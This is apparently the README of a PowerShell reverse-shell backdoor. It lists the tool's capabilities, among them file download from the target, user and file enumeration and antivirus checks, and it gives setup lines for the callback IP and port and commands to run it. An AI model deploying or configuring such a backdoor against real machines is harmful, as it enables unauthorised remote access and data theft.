# powershell-backdoor
A simple Powershell Reverse Backdoor

# Features / To Do
## Features 
* Download Files from remote system
* Fetch target computers public IP address
* List local users
* Find Intresting Files
* Get OS Information
* Get BIOS Information
* Get Anti-Virus Status
* Get Active TCP Clients
* Checks for common pentesting software installed
## To Do 
* Find Writeable Directories
* Get Windows Update Status

# Setup
Find the class Backdoor, and change the following lines 
```powershell
class Backdoor {
  # Change this to the correct ip/port
  [string]$ipAddress = "127.0.0.1"
  [int]$port = 4444
```

# Execution
```cmd
powershell.exe -File backdoor.ps1 -ExecutionPolicy Unrestricted
```
```cmd
┌──(drew㉿kali)-[/home/drew/Documents]
└─PS> ./backdoor.ps1
```
